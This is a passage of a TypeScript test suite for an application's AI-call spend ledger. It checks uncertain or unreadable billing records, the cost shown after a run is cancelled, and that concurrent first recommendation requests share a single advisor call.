});

describe('Settings: Spending records (F03, ADR-0095)', () => {
  /** A call admitted and sent in the spend book whose answer never came: it may have been billed. */
  async function interruptedCall(d: Deps, usd: number): Promise<string> {
    const book = d.services.store.spendBook;
    const opId = `op-${Math.random().toString(36).slice(2)}`;
    await book.admit({ opId, owner: 'gone', leaseMs: 60_000, workspaceId: d.workspaceId, purpose: 'advisor.intake', kind: 'completion', provider: 'anthropic', model: 'claude-opus-5-5', reserveUsd: usd, paid: true, caps: { workspaceUsd: 1000 } });
    await book.markSent(opId, 'gone');
    await book.abandon(opId);
    return opId;
  }

  it('lists a call that may have been billed, counts it against what is left, and clears it', async () => {
    const d = await deps();
    const before = await workspaceRemaining(d);
    const opId = await interruptedCall(d, 0.5);
    const { records, spend } = await spendRecords(d);
    expect(records.uncertain).toEqual([expect.objectContaining({ opId, usd: 0.5, reason: 'failed', provider: 'anthropic', purpose: 'advisor.intake' })]);
    expect(spend).toMatchObject({ uncertainUsd: 0.5, remainingUsd: before.remainingUsd - 0.5 });
    const cleared = await spendAction(d, { clear: [opId] });
    expect(cleared.records.uncertain).toEqual([]);
    expect(cleared.spend.remainingUsd).toBe(before.remainingUsd);
    // A second click finds nothing left to clear.
    expect((await spendAction(d, { clear: [opId] })).records.uncertain).toEqual([]);
  });

  it('pauses paid calls on a line of the ledger it cannot read, names it, and lets them go on once acknowledged; demo calls go on meanwhile', async () => {
    const d = await deps();
    const { intakeId } = await createIntake(d, { text: 'A landing page for my pottery studio' });
    await currentRecommendation(d, intakeId);
    const file = path.join(current!.dataDir, 'ledger.jsonl');
    writeFileSync(file, `{"workspaceId":"x"}\n${readFileSync(file, 'utf8')}`);
    const { records } = await spendRecords(d);
    expect(records.faults).toEqual([expect.objectContaining({ detail: expect.stringMatching(/byte 0 of ledger\.jsonl/) })]);
    const paid = await d.services.store.spendBook.admit({ opId: 'paid-1', owner: 'me', leaseMs: 60_000, workspaceId: d.workspaceId, purpose: 'advisor.intake', kind: 'completion', provider: 'anthropic', model: 'claude-opus-5-5', reserveUsd: 0.1, paid: true, caps: { workspaceUsd: 1000 } });
    expect(paid).toEqual({ fault: expect.stringMatching(/Settings/) });
    // The demo's calls cost nothing, so they go on.
    await expect(recommendIntake(d, intakeId)).resolves.toMatchObject({ recipeId: expect.any(String) });
    expect(await checkLedger(d)).toEqual({ intact: false, message: expect.stringMatching(/^Line 1 of the spend ledger cannot be read as an entry\. .*Spending records/) });
    const after = await spendAction(d, { acknowledge: records.faults[0]!.id });
    expect(after.records.faults).toEqual([]);
    expect(await d.services.store.spendBook.admit({ opId: 'paid-2', owner: 'me', leaseMs: 60_000, workspaceId: d.workspaceId, purpose: 'advisor.intake', kind: 'completion', provider: 'anthropic', model: 'claude-opus-5-5', reserveUsd: 0.1, paid: true, caps: { workspaceUsd: 1000 } })).toEqual({ admitted: true });
  });

  it('notes a torn ledger tail that was set aside, and settled calls not yet in the ledger', async () => {
    const d = await deps();
    writeFileSync(path.join(current!.dataDir, 'ledger.jsonl.damaged-20261008T120000000Z-77'), '{"workspaceId":"ws","cost');
    const { records } = await spendRecords(d);
    expect(records.setAside).toEqual(['ledger.jsonl.damaged-20261008T120000000Z-77']);
    expect(records.notInAuditFile).toBe(0);
  });
});

// RS-5: the run shows Cancelled at once (ADR-0111), while a call byway does not cut off is still under way; its cost is
// added to the run when it settles. What the Run screen polls says so, from the spend book, until none is left.
describe('what the Run screen polls once its run has ended (ADR-0111)', () => {
  async function startedRun(d: Deps): Promise<string> {
    const { intakeId } = await createIntake(d, { text: 'Tighten my quarterly memo', recipeId: 'c4' });
    return (await startRun(d, { intakeId, recipeId: 'c4', budgetUsd: 2 })).runId;
  }
  const call = (d: Deps, opId: string, runId?: string) => ({
    opId,
    owner: 'worker',
    leaseMs: 60_000,
    workspaceId: d.workspaceId,
    ...(runId ? { runId } : {}),
    purpose: 'build:prose',
    kind: 'completion' as const,
    provider: 'google' as const,
    model: 'gemini-3-pro',
    reserveUsd: 0.3,
    paid: true,
    caps: { workspaceUsd: 1000 },
  });

  it("counts the run's own calls still under way, and once none is, its settled cost", async () => {
    const d = await deps();
    const runId = await startedRun(d);
    const other = await startedRun(d);
    const book = d.services.store.spendBook;
    for (const [opId, run] of [['finishes', runId], ['cut-off', runId], ['other-run', other], ['no-run', undefined]] as const) {
      expect(await book.admit(call(d, opId, run))).toEqual({ admitted: true });
    }
    // While the run goes on, nothing is read from the book: the screen polls as it always has.
    expect((await getRunData(d.services, runId)).ended).toBeUndefined();

    await controlRun(d, runId, 'cancel');
    expect((await getRunData(d.services, runId)).ended).toEqual({ callsUnderWay: 2, settledUsd: 0 });
    // byway cuts one off: it may have been billed, so it counts against the workspace, not the run.
    expect(await book.markSent('cut-off', 'worker')).toBe(true);
    await book.abandon('cut-off', 'interrupted');
    expect((await getRunData(d.services, runId)).ended).toEqual({ callsUnderWay: 1, settledUsd: 0 });
    // The other finishes after the run stopped, and is settled at its cost: the run's.
    await book.settle('finishes', {
      at: '2026-10-22T10:00:00.000Z',
      entry: {
        workspaceId: d.workspaceId,
        runId,
        stepId: 'write',
        purpose: 'build:prose',
        kind: 'completion',
        provider: 'google',
        requestedModel: 'gemini-3-pro',
        servedModel: 'gemini-3-pro',
        requestSha256: `sha256:${'a'.repeat(64)}`,
        responseSha256: `sha256:${'b'.repeat(64)}`,
        usage: { inputTokens: 100, outputTokens: 1000 },
        costUsd: 0.12,
        latencyMs: 5,
      },
    });
    expect((await getRunData(d.services, runId)).ended).toEqual({ callsUnderWay: 0, settledUsd: 0.12 });
  });

  it('leaves it out when the spend book cannot be read, so the screen stops polling at the end as before', async () => {
    const d = await deps();
    const runId = await startedRun(d);
    await controlRun(d, runId, 'cancel');
    vi.spyOn(d.services.gateway, 'spendRecords').mockRejectedValue(new Error('the book is locked'));
    const data = await getRunData(d.services, runId);
    expect(data.view.run.status).toBe('cancelled');
    expect(data.ended).toBeUndefined();
  });
});

describe('the first recommendation is asked for once per intake (F03, ADR-0091)', () => {
  const intakeCalls = () =>
    readFileSync(path.join(current!.dataDir, 'ledger.jsonl'), 'utf8')
      .trim()
      .split('\n')
      .map((l) => JSON.parse(l) as { purpose: string })
      .filter((e) => e.purpose === 'advisor.intake').length;

  // The screen asks for the first recommendation once it is shown ({ ensure: true }); the page's render only reads it
  // (recommend-page.test.ts). Two tabs, or a remount, make two first asks at once.
  it("two of the screen's first asks for one intake at once share one advisor call and one ledger entry", async () => {
    const d = await deps();
    const { intakeId } = await createIntake(d, { text: 'A landing page for my pottery studio' });
    const recommend = vi.spyOn(d.services.advisor, 'recommend');
    const [a, b] = await Promise.all([recommendCommand(d, intakeId, { ensure: true }), recommendCommand(d, intakeId, { ensure: true })]);
    expect(a.recommendation).toEqual(b.recommendation);
    expect(recommend).toHaveBeenCalledTimes(1);
    expect(intakeCalls()).toBe(1);
    // Later asks read the stored one.
    await recommendCommand(d, intakeId, { ensure: true });
    expect(recommend).toHaveBeenCalledTimes(1);
  });

  it('the first ask and Try again at once share the call too', async () => {
    const d = await deps();
    const { intakeId } = await createIntake(d, { text: 'Tighten my quarterly memo' });
    const recommend = vi.spyOn(d.services.advisor, 'recommend');
    const [first, command] = await Promise.all([currentRecommendation(d, intakeId), recommendCommand(d, intakeId, { ensure: true })]);
    expect(first).toEqual(command.recommendation);
    expect(recommend).toHaveBeenCalledTimes(1);
    expect(intakeCalls()).toBe(1);
  });

  it('shares a failure with the asks that joined it, keeps nothing, and the next ask tries again', async () => {
    const d = await deps();
    const { intakeId } = await createIntake(d, { text: 'A memo' });
    const recommend = vi.spyOn(d.services.advisor, 'recommend');
    recommend.mockRejectedValueOnce(new GatewayError('rate-limited', 'rate-limited from the provider'));
    const both = await Promise.allSettled([recommendCommand(d, intakeId, { ensure: true }), recommendCommand(d, intakeId, { ensure: true })]);
    expect(both).toEqual([
      { status: 'rejected', reason: expect.objectContaining({ message: expect.stringMatching(/busy/) }) },
      { status: 'rejected', reason: expect.objectContaining({ message: expect.stringMatching(/busy/) }) },
    ]);
    expect(recommend).toHaveBeenCalledTimes(1);
    expect((await recommendCommand(d, intakeId, { ensure: true })).recommendation.recipeId).toBeTruthy();
    expect(recommend).toHaveBeenCalledTimes(2);
  });

  it('does not share between intakes', async () => {
    const d = await deps();
    const one = await createIntake(d, { text: 'A landing page for my pottery studio' });
    const two = await createIntake(d, { text: 'Tighten my quarterly memo' });
    const recommend = vi.spyOn(d.services.advisor, 'recommend');
    await Promise.all([currentRecommendation(d, one.intakeId), currentRecommendation(d, two.intakeId)]);
    expect(recommend).toHaveBeenCalledTimes(2);
  });
});
